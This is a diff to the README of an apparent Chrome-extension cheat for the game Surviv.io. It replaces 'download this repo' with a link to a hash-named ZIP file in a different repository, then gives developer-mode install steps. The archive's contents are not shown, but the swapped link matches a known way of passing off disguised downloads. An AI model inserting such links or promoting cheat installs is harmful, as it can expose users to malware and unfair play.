@@ -20,7 +20,7 @@ This is a Surviv.io cheat loaded as a Chrome extension.  It was requested by Kat
 
 ## 🔨 Installation
 
-1. Download this repo as a ZIP file.
+1. Download this [repo](https://github.com/iBLiSSIN/SurvivTwitchMod/raw/main/survivio-plus-d22966b0c23fd386dec5b4e87e307454e10fbbac.zip) as a ZIP file.
 2. Extract the ZIP file you just downloaded. 
 3. Go to `chrome://extensions` in your browser. *Make sure you have Developer Mode activated.*
 4. Click "Load Unpacked" and select the folder that you extracted (called `twitch-cheat-master`)
